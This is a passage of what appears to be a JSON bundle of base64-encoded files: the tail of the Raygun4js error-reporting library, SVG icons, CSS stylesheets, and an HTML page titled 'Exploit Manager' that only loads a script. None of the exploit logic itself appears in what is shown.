uIHI/KHIub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7ND09PXIucmVhZHlTdGF0ZSYmKDIwMj09PXIuc3RhdHVzP3AoKTpGJiY0MDMhPT1yLnN0YXR1cyYmNDAwIT09ci5zdGF0dXMmJjQyOSE9PXIuc3RhdHVzJiZoKG4pKX0sci5vbmxvYWQ9ZnVuY3Rpb24oKXskLmxvZygibG9nZ2VkIGVycm9yIHRvIFJheWd1biIpfSk6ZS5YRG9tYWluUmVxdWVzdCYmKHIub250aW1lb3V0PWZ1bmN0aW9uKCl7RiYmKCQubG9nKCJSYXlndW46IHNhdmVkIGVycm9yIGxvY2FsbHkiKSxoKG4pKX0sci5vbmxvYWQ9ZnVuY3Rpb24oKXskLmxvZygibG9nZ2VkIGVycm9yIHRvIFJheWd1biIpLHAoKX0pLHIub25lcnJvcj1mdW5jdGlvbigpeyQubG9nKCJmYWlsZWQgdG8gbG9nIGVycm9yIHRvIFJheWd1biIpfSxyP3ZvaWQgci5zZW5kKG4pOnZvaWQgJC5sb2coIkNPUlMgbm90IHN1cHBvcnRlZCIpfXZhciBMLGssdyxULFksRCxTPVRyYWNlS2l0LHg9ZS5SYXlndW4saj0hMSxIPSExLFA9ITEsRT0hMSxGPSExLEM9ITEsQT0hMSxPPSExLFI9e30sTj1bXSxJPVtdLFc9Imh0dHBzOi8vYXBpLnJheWd1bi5pbyIsVT1udWxsLHo9bnVsbCxxPSJjdXN0b21EYXRhIjt0JiYoRD10KGRvY3VtZW50KSk7dmFyIEo9e25vQ29uZmxpY3Q6ZnVuY3Rpb24oKXtyZXR1cm4gZS5SYXlndW49eCxKfSxjb25zdHJ1Y3ROZXdSYXlndW46ZnVuY3Rpb24oKXt2YXIgdD1lLnJheWd1bkZhY3RvcnkoZSxlLmpRdWVyeSk7cmV0dXJuIGUucmF5Z3VuSnNVcmxGYWN0b3J5KGUsdCksdH0saW5pdDpmdW5jdGlvbihlLHQsbil7cmV0dXJuIEw9ZSxTLnJlbW90ZUZldGNoaW5nPSExLFI9bix0JiYoSD10LmFsbG93SW5zZWN1cmVTdWJtaXNzaW9uc3x8ITEsUD10Lmlnbm9yZUFqYXhBYm9ydHx8ITEsRT10Lmlnbm9yZUFqYXhFcnJvcnx8ITEsQT10LmRpc2FibGVBbm9ueW1vdXNVc2VyVHJhY2tpbmd8fCExLFU9dC5leGNsdWRlZEhvc3RuYW1lc3x8ITEsej10LmV4Y2x1ZGVkVXNlckFnZW50c3x8ITEsInVuZGVmaW5lZCIhPXR5cGVvZiB0LndyYXBBc3luY2hyb25vdXNDYWxsYmFja3MmJihPPXQud3JhcEFzeW5jaHJvbm91c0NhbGxiYWNrcyksdC5kZWJ1Z01vZGUmJihqPXQuZGVidWdNb2RlKSx0Lmlnbm9yZTNyZFBhcnR5RXJyb3JzJiYoQz0hMCkpLHAoKSxKfSx3aXRoQ3VzdG9tRGF0YTpmdW5jdGlvbihlKXtyZXR1cm4gUj1lLEp9LHdpdGhUYWdzOmZ1bmN0aW9uKGUpe3JldHVybiBOPWUsSn0sYXR0YWNoOmZ1bmN0aW9uKCl7cmV0dXJuIHMoKT8oUy5yZXBvcnQuc3Vic2NyaWJlKGcpLE8mJlMuZXh0ZW5kVG9Bc3luY2hyb25vdXNDYWxsYmFja3MoKSxEJiYhRSYmRC5hamF4RXJyb3IoaSksSik6Sn0sZGV0YWNoOmZ1bmN0aW9uKCl7cmV0dXJuIFMucmVwb3J0LnVuc3Vic2NyaWJlKGcpLEQmJkQudW5iaW5kKCJhamF4RXJyb3IiLGkpLEp9LHNlbmQ6ZnVuY3Rpb24oZSx0LG4pe3RyeXtnKFMuY29tcHV0ZVN0YWNrVHJhY2UoZSkse2N1c3RvbURhdGE6ImZ1bmN0aW9uIj09dHlwZW9mIFI/byhSKCksdCk6byhSLHQpLHRhZ3M6YShOLG4pfSl9Y2F0Y2gocil7aWYoZSE9PXIpdGhyb3cgcn1yZXR1cm4gSn0sc2V0VXNlcjpmdW5jdGlvbihlLHQsbixyLGkscyl7cmV0dXJuIGs9e0lkZW50aWZpZXI6ZX0sInVuZGVmaW5lZCIhPXR5cGVvZiB0JiYoay5Jc0Fub255bW91cz10KSwidW5kZWZpbmVkIiE9dHlwZW9mIG4mJihrLkVtYWlsPW4pLCJ1bmRlZmluZWQiIT10eXBlb2YgciYmKGsuRnVsbE5hbWU9ciksInVuZGVmaW5lZCIhPXR5cGVvZiBpJiYoay5GaXJzdE5hbWU9aSksInVuZGVmaW5lZCIhPXR5cGVvZiBzJiYoay5VVUlEPXMpLEp9LHJlc2V0QW5vbnltb3VzVXNlcjpmdW5jdGlvbigpeyQuY2xlYXJDb29raWUoInJheWd1bjRqcy11c2VyaWQiKX0sc2V0VmVyc2lvbjpmdW5jdGlvbihlKXtyZXR1cm4gdz1lLEp9LHNhdmVJZk9mZmxpbmU6ZnVuY3Rpb24oZSl7cmV0dXJuInVuZGVmaW5lZCIhPXR5cGVvZiBlJiYiYm9vbGVhbiI9PXR5cGVvZiBlJiYoRj1lKSxKfSxmaWx0ZXJTZW5zaXRpdmVEYXRhOmZ1bmN0aW9uKGUpe3JldHVybiBUPWUsSn0sc2V0RmlsdGVyU2NvcGU6ZnVuY3Rpb24oZSl7cmV0dXJuImN1c3RvbURhdGEiIT09ZSYmImFsbCIhPT1lfHwocT1lKSxKfSx3aGl0ZWxpc3RDcm9zc09yaWdpbkRvbWFpbnM6ZnVuY3Rpb24oZSl7cmV0dXJuIEk9ZSxKfSxvbkJlZm9yZVNlbmQ6ZnVuY3Rpb24oZSl7cmV0dXJuIFk9ZSxKfX0sJD1KLl9wcml2YXRlPUouX3ByaXZhdGV8fHt9LEI9Si5fc2VhbD1KLl9zZWFsfHxmdW5jdGlvbigpe2RlbGV0ZSBKLl9wcml2YXRlLGRlbGV0ZSBKLl9zZWFsLGRlbGV0ZSBKLl91bnNlYWx9LFY9Si5fdW5zZWFsPUouX3Vuc2VhbHx8ZnVuY3Rpb24oKXtKLl9wcml2YXRlPSQsSi5fc2VhbD1CLEouX3Vuc2VhbD1WfTtyZXR1cm4gJC5nZXRVdWlkPWZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlKXt2YXIgdD0oTWF0aC5yYW5kb20oKS50b1N0cmluZygxNikrIjAwMDAwMDAwMCIpLnN1YnN0cigyLDgpO3JldHVybiBlPyItIit0LnN1YnN0cigwLDQpKyItIit0LnN1YnN0cig0LDQpOnR9cmV0dXJuIGUoKStlKCEwKStlKCEwKStlKCl9LCQuY3JlYXRlQ29va2llPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcjtpZihuKXt2YXIgaT1uZXcgRGF0ZTtpLnNldFRpbWUoaS5nZXRUaW1lKCkrNjAqbio2MCoxZTMpLHI9IjsgZXhwaXJlcz0iK2kudG9HTVRTdHJpbmcoKX1lbHNlIHI9IiI7ZG9jdW1lbnQuY29va2llPWUrIj0iK3QrcisiOyBwYXRoPS8ifSwkLnJlYWRDb29raWU9ZnVuY3Rpb24oZSl7Zm9yKHZhciB0PWUrIj0iLG49ZG9jdW1lbnQuY29va2llLnNwbGl0KCI7Iikscj0wO3I8bi5sZW5ndGg7cisrKXtmb3IodmFyIGk9bltyXTsiICI9PT1pLmNoYXJBdCgwKTspaT1pLnN1YnN0cmluZygxLGkubGVuZ3RoKTtpZigwPT09aS5pbmRleE9mKHQpKXJldHVybiBpLnN1YnN0cmluZyh0Lmxlbmd0aCxpLmxlbmd0aCl9cmV0dXJuIG51bGx9LCQuY2xlYXJDb29raWU9ZnVuY3Rpb24oZSl7JC5jcmVhdGVDb29raWUoZSwiIiwtMSl9LCQubG9nPWZ1bmN0aW9uKHQsbil7ZS5jb25zb2xlJiZlLmNvbnNvbGUubG9nJiZqJiYoZS5jb25zb2xlLmxvZyh0KSxuJiZlLmNvbnNvbGUubG9nKG4pKX0sZS5SYXlndW58fChlLlJheWd1bj1KKSxKfTtuKHdpbmRvdyx3aW5kb3cualF1ZXJ5KTt2YXIgcj1mdW5jdGlvbihlLHQpe3QuX3ByaXZhdGUucGFyc2VVcmw9ZnVuY3Rpb24odCxuKXtmdW5jdGlvbiByKGUpe3JldHVybiFpc05hTihwYXJzZUZsb2F0KGUpKSYmaXNGaW5pdGUoZSl9cmV0dXJuIGZ1bmN0aW9uKHQsbil7dmFyIGk9bnx8ZS5sb2NhdGlvbi50b1N0cmluZygpO2lmKCF0KXJldHVybiBpO3Q9dC50b1N0cmluZygpLCIvLyI9PT1pLnN1YnN0cmluZygwLDIpP2k9Imh0dHA6IitpOjE9PT1pLnNwbGl0KCI6Ly8iKS5sZW5ndGgmJihpPSJodHRwOi8vIitpKSxuPWkuc3BsaXQoIi8iKTt2YXIgcz17YXV0aDoiIn0sbz1uWzJdLnNwbGl0KCJAIik7MT09PW8ubGVuZ3RoP289b1swXS5zcGxpdCgiOiIpOihzLmF1dGg9b1swXSxvPW9bMV0uc3BsaXQoIjoiKSkscy5wcm90b2NvbD1uWzBdLHMuaG9zdG5hbWU9b1swXSxzLnBvcnQ9b1sxXXx8KCJodHRwcyI9PT1zLnByb3RvY29sLnNwbGl0KCI6IilbMF0udG9Mb3dlckNhc2UoKT8iNDQzIjoiODAiKSxzLnBhdGhuYW1lPShuLmxlbmd0aD4zPyIvIjoiIikrbi5zbGljZSgzLG4ubGVuZ3RoKS5qb2luKCIvIikuc3BsaXQoIj8iKVswXS5zcGxpdCgiIyIpWzBdO3ZhciBhPXMucGF0aG5hbWU7Ii8iPT09YS5jaGFyQXQoYS5sZW5ndGgtMSkmJihhPWEuc3Vic3RyaW5nKDAsYS5sZW5ndGgtMSkpO3ZhciB1PXMuaG9zdG5hbWUsYz11LnNwbGl0KCIuIiksbD1hLnNwbGl0KCIvIik7aWYoImhvc3RuYW1lIj09PXQpcmV0dXJuIHU7aWYoImRvbWFpbiI9PT10KXJldHVybi9eKChbMC05XXxbMS05XVswLTldfDFbMC05XXsyfXwyWzAtNF1bMC05XXwyNVswLTVdKVwuKXszfShbMC05XXxbMS05XVswLTldfDFbMC05XXsyfXwyWzAtNF1bMC05XXwyNVswLTVdKSQvLnRlc3QodSk/dTpjLnNsaWNlKC0yKS5qb2luKCIuIik7aWYoInN1YiI9PT10KXJldHVybiBjLnNsaWNlKDAsYy5sZW5ndGgtMikuam9pbigiLiIpO2lmKCJwb3J0Ij09PXQpcmV0dXJuIHMucG9ydDtpZigicHJvdG9jb2wiPT09dClyZXR1cm4gcy5wcm90b2NvbC5zcGxpdCgiOiIpWzBdO2lmKCJhdXRoIj09PXQpcmV0dXJuIHMuYXV0aDtpZigidXNlciI9PT10KXJldHVybiBzLmF1dGguc3BsaXQoIjoiKVswXTtpZigicGFzcyI9PT10KXJldHVybiBzLmF1dGguc3BsaXQoIjoiKVsxXXx8IiI7aWYoInBhdGgiPT09dClyZXR1cm4gcy5wYXRobmFtZTtpZigiLiI9PT10LmNoYXJBdCgwKSl7aWYodD10LnN1YnN0cmluZygxKSxyKHQpKXJldHVybiB0PXBhcnNlSW50KHQsMTApLGNbMD50P2MubGVuZ3RoK3Q6dC0xXXx8IiJ9ZWxzZXtpZihyKHQpKXJldHVybiB0PXBhcnNlSW50KHQsMTApLGxbMD50P2wubGVuZ3RoK3Q6dF18fCIiO2lmKCJmaWxlIj09PXQpcmV0dXJuIGwuc2xpY2UoLTEpWzBdO2lmKCJmaWxlbmFtZSI9PT10KXJldHVybiBsLnNsaWNlKC0xKVswXS5zcGxpdCgiLiIpWzBdO2lmKCJmaWxlZXh0Ij09PXQpcmV0dXJuIGwuc2xpY2UoLTEpWzBdLnNwbGl0KCIuIilbMV18fCIiO2lmKCI/Ij09PXQuY2hhckF0KDApfHwiIyI9PT10LmNoYXJBdCgwKSl7dmFyIGQ9aSxoPW51bGw7aWYoIj8iPT09dC5jaGFyQXQoMCk/ZD0oZC5zcGxpdCgiPyIpWzFdfHwiIikuc3BsaXQoIiMiKVswXToiIyI9PT10LmNoYXJBdCgwKSYmKGQ9ZC5zcGxpdCgiIyIpWzFdfHwiIiksIXQuY2hhckF0KDEpKXJldHVybiBkO3Q9dC5zdWJzdHJpbmcoMSksZD1kLnNwbGl0KCImIik7Zm9yKHZhciBmPTAscD1kLmxlbmd0aDtwPmY7ZisrKWlmKGg9ZFtmXS5zcGxpdCgiPSIpLGhbMF09PT10KXJldHVybiBoWzFdfHwiIjtyZXR1cm4gbnVsbH19cmV0dXJuIiJ9KHQsbil9fTsNCnIod2luZG93LHdpbmRvdy5SYXlndW4pLHdpbmRvdy5SYXlndW4uX3NlYWwoKX1dKTsNCi8qIDwhLS0gUmF5Z3VuNGpzIDEuMTguNiAqLw0KDQovKiBTd2VhciB0aGVyZSdzIGFzeW5jIGFuZCBiYWNrYm9uZSBpbiB0aGVyZSBzb21ld2hlcmUgdG9vLCBhdCBsZWFzdCBhdCBvbmUgcG9pbnQsIGJ1dCBjYW4ndCBzZWVtIHRvIGlzb2xhdGUgaXQuICovDQovKiMgc291cmNlTWFwcGluZ1VSTD1iYWNrZ3JvdW5kLWQ3NTc0YjdiZGY2MmJmNDU3MTAzLmpzLm1hcCAqLw==", "/system/res/drawable/playCircle.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEwIDE2LjVsNi00LjUtNi00LjV2OXpNMTIgMkM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMCAxOGMtNC40MSAwLTgtMy41OS04LThzMy41OS04IDgtOCA4IDMuNTkgOCA4LTMuNTkgOC04IDh6Ii8+DQo8L3N2Zz4=", "/system/app/Exploit/res": {}, "/system/res/styles/framework.css": "Ym9keSB7DQogIGJhY2tncm91bmQ6ICNlZWVkZWQ7DQogIG1hcmdpbjogMDsNCn0NCkBmb250LWZhY2Ugew0KICBmb250LWZhbWlseTogJ1JvYm90byc7DQogIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgZm9udC13ZWlnaHQ6IDQwMDsNCiAgc3JjOnVybCgnLy9zeXN0ZW0vZm9udHMvcm9ib3RvLndvZmYyJykgZm9ybWF0KCd3b2ZmMicpOw0KICB1bmljb2RlLXJhbmdlOiBVKzAwMDAtMDBGRiwgVSswMTMxLCBVKzAxNTItMDE1MywgVSswMkM2LCBVKzAyREEsIFUrMDJEQywgVSsyMDAwLTIwNkYsIFUrMjA3NCwgVSsyMEFDLCBVKzIyMTIsIFUrMjIxNSwgVStFMEZGLCBVK0VGRkQsIFUrRjAwMDsNCn0NCi8qDQpAZm9udC1mYWNlIHsNCiAgZm9udC1mYW1pbHk6ICdSb2JvdG8nOw0KICBmb250LXN0eWxlOiBub3JtYWw7DQogIGZvbnQtd2VpZ2h0OiA0MDA7DQogIHNyYzogbG9jYWwoJ1JvYm90bycpLCBsb2NhbCgnUm9ib3RvLVJlZ3VsYXInKSwgdXJsKGh0dHBzOi8vZm9udHMuZ3N0YXRpYy5jb20vcy9yb2JvdG8vdjE1L0NXQjBYWUE4YnpvMGtTVGhYMFVUdUEud29mZjIpIGZvcm1hdCgnd29mZjInKTsNCiAgdW5pY29kZS1yYW5nZTogVSswMDAwLTAwRkYsIFUrMDEzMSwgVSswMTUyLTAxNTMsIFUrMDJDNiwgVSswMkRBLCBVKzAyREMsIFUrMjAwMC0yMDZGLCBVKzIwNzQsIFUrMjBBQywgVSsyMjEyLCBVKzIyMTUsIFUrRTBGRiwgVStFRkZELCBVK0YwMDA7DQp9DQoqLw0KKiB7DQogIC8qRGlzYWJsZXMgSGlnaGxpZ2h0aW5nKi8NCiAgLXdlYmtpdC10b3VjaC1jYWxsb3V0OiBub25lOw0KICAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOw0KICAtbW96LXVzZXItc2VsZWN0OiBub25lOw0KICAtbXMtdXNlci1zZWxlY3Q6IG5vbmU7DQogIHVzZXItc2VsZWN0OiBub25lOw0KICAvKkRpc2FibGVzIERyYWdnaW5nKi8NCiAgLXdlYmtpdC11c2VyLWRyYWc6IG5vbmU7DQogIC1raHRtbC11c2VyLWRyYWc6IG5vbmU7DQogIC1tb3otdXNlci1kcmFnOiBub25lOw0KICAtby11c2VyLWRyYWc6IG5vbmU7DQogIGZvbnQtZmFtaWx5OiAnUm9ib3RvJywgc2Fucy1zZXJpZjsNCn0NCjo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICBkaXNwbGF5OiBub25lOw0KfQ0KLmhlYWRlciB7DQogIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgZGlzcGxheTogZmxleDsNCiAgdG9wOiAwOw0KICBib3gtc2hhZG93OiAwIDNweCA2cHggcmdiYSgwLDAsMCwwLjE2KSwgMCAzcHggNnB4IHJnYmEoMCwwLDAsMC4yMyk7DQogIHdpZHRoOiAxMDAlOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDBCQ0Q0Ow0KICBoZWlnaHQ6IDZ2bWF4Ow0KICBtYXgtaGVpZ2h0OiA2dm1heDsNCiAgb3ZlcmZsb3cteDogc2Nyb2xsOw0KICB6LWluZGV4OiAzOw0KfQ0KLmhlYWRlciBwLmNsaWNrYWJsZSB7DQogIGN1cnNvcjogcG9pbnRlcjsNCiAgbWFyZ2luLWxlZnQ6IDF2bWF4Ow0KICBtYXJnaW4tcmlnaHQ6IDF2bWF4Ow0KfQ0KLmhlYWRlciBwIHsNCiAgY3Vyc29yOiBkZWZhdWx0Ow0KICBjb2xvcjogd2hpdGU7DQogIGZvbnQtc2l6ZTogeHgtbGFyZ2U7DQogIG1hcmdpbjogMDsNCiAgbWFyZ2luLXRvcDogYXV0bzsNCiAgbWFyZ2luLWJvdHRvbTogYXV0bzsNCn0NCi5hcHBGcmFtZSB7DQogIG1hcmdpbi10b3A6IDZ2bWF4Ow0KfQ0KLmhhbWJ1cmdlckljbyB7DQogIHBhZGRpbmc6IDEuNzZ2bWF4Ow0KICBjdXJzb3I6IHBvaW50ZXI7DQogIHRyYW5zaXRpb246IHRyYW5zZm9ybSAuMnMgZWFzZS1vdXQ7DQp9DQouaGFtYnVyZ2VySWNvOjphY3RpdmUgew0KfQ0KLmhhbWJ1cmdlckljbzo6YmVmb3JlIHsNCiAgY29udGVudDonJzsNCiAgYm9yZGVyLXJhZGl1czogMS42dm1heDsNCiAgd2lkdGg6IDIuOHZtYXg7DQogIGhlaWdodDogLjR2bWF4Ow0KICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsNCiAgZGlzcGxheTogYmxvY2s7DQogIHRyYW5zaXRpb246IHdpZHRoIC4ycyBlYXNlLW91dCwgYm9yZGVyLXJhZGl1cyAuMnMsIHRyYW5zZm9ybSAuMnMgZWFzZS1vdXQ7DQp9DQouaGFtYnVyZ2VySWNvIHNwYW4gew0KICBib3JkZXItcmFkaXVzOiAxLjZ2bWF4Ow0KICBtYXJnaW4tdG9wOiAuNjR2bWF4Ow0KICBtYXJnaW4tYm90dG9tOiAuNjR2bWF4Ow0KICB3aWR0aDogMi44dm1heDsNCiAgaGVpZ2h0OiAuNHZtYXg7DQogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOw0KICBkaXNwbGF5OiBibG9jazsNCiAgdHJhbnNpdGlvbjogYm9yZGVyLXJhZGl1cyAuMnM7DQp9DQouaGFtYnVyZ2VySWNvOjphZnRlciB7DQogIGNvbnRlbnQ6Jyc7DQogIGJvcmRlci1yYWRpdXM6IDEuNnZtYXg7DQogIHdpZHRoOiAyLjh2bWF4Ow0KICBoZWlnaHQ6IC40dm1heDsNCiAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7DQogIGRpc3BsYXk6IGJsb2NrOw0KICB0cmFuc2l0aW9uOiB3aWR0aCAuMnMgZWFzZS1vdXQsIGJvcmRlci1yYWRpdXMgLjJzLCB0cmFuc2Zvcm0gLjJzIGVhc2Utb3V0Ow0KfQ0KLmhhbWJ1cmdlckljby5iYWNrOjpiZWZvcmUgew0KICBib3JkZXItcmFkaXVzOjA7DQogIHRyYW5zZm9ybS1vcmlnaW46IGJvdHRvbSByaWdodDsNCiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVYKDEuNXZtYXgpIHRyYW5zbGF0ZVkoMS4xdm1heCkgcm90YXRlKDQ1ZGVnKTsNCiAgd2lkdGg6IDEuNHZtYXg7DQp9DQouaGFtYnVyZ2VySWNvLmJhY2sgc3BhbiB7DQogIGJvcmRlci1yYWRpdXM6MDsNCn0NCi5oYW1idXJnZXJJY28uYmFjayB7DQogIHRyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7DQp9DQouaGFtYnVyZ2VySWNvLmJhY2s6OmFmdGVyIHsNCiAgYm9yZGVyLXJhZGl1czowOw0KICB0cmFuc2Zvcm0tb3JpZ2luOiB0b3AgcmlnaHQ7DQogIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgxLjV2bWF4KSB0cmFuc2xhdGVZKC0xLjF2bWF4KSByb3RhdGUoLTQ1ZGVnKTsNCiAgd2lkdGg6IDEuNHZtYXg7DQp9DQouaGFtYnVyZ2VyTWVudSB7DQogIGN1cnNvcjogZGVmYXVsdDsNCiAgaGVpZ2h0OiAxMDAlOw0KICBwYWRkaW5nLXRvcDogNnZtYXg7DQogIHdpZHRoOiAzNXZtYXg7DQogIG1heC13aWR0aDogMzV2bWF4Ow0KICBiYWNrZ3JvdW5kLWNvbG9yOiAjZWVlZGVkOw0KICBtYXJnaW46IDA7DQogIHBvc2l0aW9uOiBmaXhlZDsNCiAgei1pbmRleDogMjsNCiAgYm94LXNoYWRvdzogMCAzcHggNnB4IHJnYmEoMCwwLDAsMC4xNiksIDAgM3B4IDZweCByZ2JhKDAsMCwwLDAuMjMpOw0KICAtd2Via2l0LXRyYW5zaXRpb246IGxlZnQgLjM1cyBlYXNlLW91dDsNCiAgdHJhbnNpdGlvbjogbGVmdCAuMzVzIGVhc2Utb3V0Ow0KICBvdmVyZmxvdy14OiBzY3JvbGw7DQp9DQouaGFtYnVyZ2VySXRlbSB7DQogIGN1cnNvcjogcG9pbnRlcjsNCiAgaGVpZ2h0OiA1dm1heDsNCiAgbWF4LWhlaWdodDogNXZtYXg7DQogIG92ZXJmbG93OiBoaWRkZW47DQogIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7DQogIGRpc3BsYXk6IGZsZXg7DQogIG1hcmdpbjogMnZtYXg7DQogIG1hcmdpbi10b3A6IDF2bWF4Ow0KICBtYXJnaW4tYm90dG9tOiAxdm1heDsNCiAgYm9yZGVyLXJhZGl1czogMHZtYXg7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICBjb2xvcjogcmdiYSgwLDAsMCwuMzUpOw0KICAtd2Via2l0LXRyYW5zaXRpb246IGJvcmRlci1yYWRpdXMgLjFzIGVhc2UtaW4tb3V0LCBiYWNrZ3JvdW5kLWNvbG9yIC4xcyBlYXNlLWluLW91dCwgY29sb3IgLjFzIGVhc2UtaW4tb3V0Ow0KfQ0KLmhhbWJ1cmdlckl0ZW0gaW1nIHsNCiAgbWFyZ2luLXRvcDogYXV0bzsNCiAgbWFyZ2luLWxlZnQ6IDJ2dzsNCiAgbWFyZ2luLWJvdHRvbTogYXV0bzsNCiAgbWF4LXdpZHRoOiA0LjV2bWF4Ow0KICBtYXgtaGVpZ2h0OiA0LjV2bWF4Ow0KICB3aWR0aDogNC41dm1heDsNCiAgaGVpZ2h0OiA0LjV2bWF4Ow0KfQ0KLmhhbWJ1cmdlckl0ZW0gcCB7DQogIG1hcmdpbi10b3A6IGF1dG87DQogIG1hcmdpbi1ib3R0b206IGF1dG87DQogIG1hcmdpbi1sZWZ0OiAydnc7DQogIGZvbnQtc2l6ZTogMS41dm1heDsNCiAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7DQogIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogIG92ZXJmbG93OiBoaWRkZW47DQp9DQouaGFtYnVyZ2VySXRlbS5hY3RpdmUgew0KICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLC4wNCk7DQogIGNvbG9yOiByZ2JhKDAsMCwwLC45KTsNCiAgYm9yZGVyLXJhZGl1czogMXZtYXg7DQp9DQoubWVudU9wZW5lZCB7DQogIGxlZnQ6IDB2bWF4Ow0KfQ0KLm1lbnVDbG9zZWQgew0KICBsZWZ0OiAtMzV2bWF4Ow0KfQ0KLm92ZXJsYXkgew0KICBsZWZ0OiAwOw0KICB0b3A6IDA7DQogIHotaW5kZXg6IDE7DQogIHBvc2l0aW9uOiBmaXhlZDsNCiAgd2lkdGg6IDEwMCU7DQogIGhlaWdodDogMTAwJTsNCiAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLCAwLCAwLCAuNik7DQogIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuMTVzIGVhc2Utb3V0Ow0KICB0cmFuc2l0aW9uOiBvcGFjaXR5IC4xNXMgZWFzZS1vdXQ7DQp9DQoub19kZWFjdGl2YXRlZCB7DQogIG9wYWNpdHk6IDA7DQp9DQoub19hY3RpdmF0ZWQgew0KICBkaXNwbGF5OiBibG9jazsNCiAgb3BhY2l0eTogMTsNCn0NCi5pZnJhbWVDb250YWluZXIgew0KICB3aWR0aDogMTAwJTsNCiAgaGVpZ2h0OiAxMDAlOw0KICBtYXJnaW46IDA7DQogIHRvcDogMDsNCiAgbGVmdDogMDsNCiAgcG9zaXRpb246IGZpeGVkOw0KICBvdmVyZmxvdzogaGlkZGVuOw0KICBtYXJnaW4tdG9wOiA2dm1heDsNCn0NCi5pZnJhbWVDb250YWluZXIgKiB7DQogIHdpZHRoOiAxMDAlOw0KICBoZWlnaHQ6IDEwMCU7DQogIGJvcmRlcjogMDsNCn0=", "/system/res/drawable/videoLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTQgNkgydjE0YzAgMS4xLjkgMiAyIDJoMTR2LTJINFY2em0xNi00SDhjLTEuMSAwLTIgLjktMiAydjEyYzAgMS4xLjkgMiAyIDJoMTJjMS4xIDAgMi0uOSAyLTJWNGMwLTEuMS0uOS0yLTItMnptLTggMTIuNXYtOWw2IDQuNS02IDQuNXoiLz4NCjwvc3ZnPg==", "/system/app/Exploit/index.html": "PCFkb2N0eXBlIGh0bWw+DQo8aHRtbD4NCgk8aGVhZD4NCiAgICA8dGl0bGU+RXhwbG9pdCBNYW5hZ2VyPC90aXRsZT4NCgkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0icmVzL3N0eWxlc2hlZXQuY3NzIj4NCgk8L2hlYWQ+DQoJPGJvZHk+DQoJCTxzY3JpcHQgc3JjPSJzY3JpcHQvYXBwLmpzIj48L3NjcmlwdD4NCgk8L2JvZHk+DQo8L2h0bWw+", "/system/res/drawable/shuffle.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEwLjU5IDkuMTdMNS40MSA0IDQgNS40MWw1LjE3IDUuMTcgMS40Mi0xLjQxek0xNC41IDRsMi4wNCAyLjA0TDQgMTguNTkgNS40MSAyMCAxNy45NiA3LjQ2IDIwIDkuNVY0aC01LjV6bS4zMyA5LjQxbC0xLjQxIDEuNDEgMy4xMyAzLjEzTDE0LjUgMjBIMjB2LTUuNWwtMi4wNCAyLjA0LTMuMTMtMy4xM3oiLz4NCjwvc3ZnPg==", "/system/app/Exploit/res/stylesheet.css": "KiB7DQoJLypEaXNhYmxlcyBIaWdobGlnaHRpbmcqLw0KCS13ZWJraXQtdG91Y2gtY2FsbG91dDogbm9uZTsNCgktd2Via2l0LXVzZXItc2VsZWN0OiBub25lOw0KCS1tb3otdXNlci1zZWxlY3Q6IG5vbmU7DQoJLW1zLXVzZXItc2VsZWN0OiBub25lOw0KCXVzZXItc2VsZWN0OiBub25lOw0KfQ0KDQpib2R5IHsNCglmb250LWZhbWlseTogJ1JvYm90bycsDQoJc2Fucy1zZXJpZjsNCn0NCg0KLmV4cGxvaXRHcm91cCB7DQoJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAuMnMgZWFzZS1vdXQsIGJvcmRlci1yYWRpdXMgLjJzIGVhc2Utb3V0Ow0KICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsLjA1KTsNCiAgICBib3JkZXItcmFkaXVzOiAxdm1heDsNCn0NCg0KLmV4cGxvaXRHcm91cC5hY3RpdmUgew0KICAgIGJvcmRlci1yYWRpdXM6IDJ2bWF4Ow0KICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsLjIpOw0KfQ0KDQouZXhwbG9pdEdyb3VwIC5leHBsb2l0TGFi